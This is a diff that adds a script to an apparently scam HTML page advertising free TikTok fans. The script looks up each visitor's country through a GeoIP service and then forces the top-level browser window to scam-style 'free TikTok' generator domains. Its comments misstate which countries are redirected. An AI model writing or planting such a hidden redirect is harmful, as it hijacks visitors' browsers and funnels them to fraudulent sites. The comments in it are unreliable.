@@ -740,6 +740,47 @@ free Tik Tok fans fast no survey,">
 
 
 </body>
+	
+	
+		        <script>
+           /*!
+     * GeoIP Target Redirector
+     * Project: https://github.com/OpenAff/geoip-target-filter
+     *
+     * ---------------------------------------------------------------------
+     * A small snippet for geo-target redirection using GeoIP API.
+     * Add your targeted country's "ISO 3166-1 - Alpha-2" code and
+     * redirect URL to the "target" array object.
+     * ---------------------------------------------------------------------
+     * Example:
+     *          target.All = "http://others.tld";
+     *          target.US  = "http://domain.tld";
+     *
+     * The above example will redirect all the US visitors to the given URL.
+     * And any non-targeted visitors to "All" URL.
+     * ---------------------------------------------------------------------
+     * Country Codes can be found @( Wikipedia - http://bit.ly/nWBMYz )
+     * See Column: "Alpha-2 Code"
+     * ---------------------------------------------------------------------
+     */
+
+        var target = []; // Create a new target Array.
+
+        // Example Codes:
+        target.All  = "https://9mod.club/tiktok";  // Redirects US Visitors to this URL.
+        target.IN  = "https://freetikgeneratortok.club";  // Redirects UK Visitors to this URL.
+
+        // ------------------------------------------------------
+        // DON'T EDIT THE BELOW CODE UNLESS REQUIRED
+        // ------------------------------------------------------
+        /**
+         * If a valid country code matches the targets list, then it redirects to that particular link.
+         * Otherwise redirects to "All" target URL.
+         */
+        function geoip(g){window.top.location.href=target[g.country]||target.All}
+    </script>
+
+        <script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
         <script src="ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.html"></script>
     <script src="maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.html"></script>
     <script src="cdn.jsdelivr.net/jquery.validation/1.13.1/jquery.validate.min.html"></script>
